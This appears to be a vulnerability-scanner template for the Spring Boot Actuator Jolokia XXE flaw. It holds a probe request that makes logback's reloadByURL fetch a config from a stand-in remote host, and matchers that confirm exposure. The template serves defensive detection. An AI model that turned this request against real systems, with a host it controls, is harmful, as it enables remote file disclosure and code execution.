id: "springboot-actuators-jolokia-xxe"
name: "Spring Boot Actuators (Jolokia) XXE"
severity: "high"
description: "A vulnerability in Spring Boot Actuators's 'jolokia' endpoint allows remote attackers to perform an XML External Entities (XXE) attack and include content stored on a remote server as if it was its own. This has the potential to allow the execution of arbitrary code and/or disclosure of sensitive information from the target machine."
tech:
  - "springboot"
tags:
  - "springboot"
  - "jolokia"
  - "xxe"
  - "vuln"
cwe: "CWE-611"
reference: "https://www.veracode.com/blog/research/exploiting-spring-boot-actuators"
spaExclusion: true
request:
  method: "GET"
  path: "/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "http:\\/\\/nonexistent:31337\\/logback.xml"
      - "reloadByURL"
      - "JoranException"
    condition: "and"
  - type: "status"
    status:
      - 200
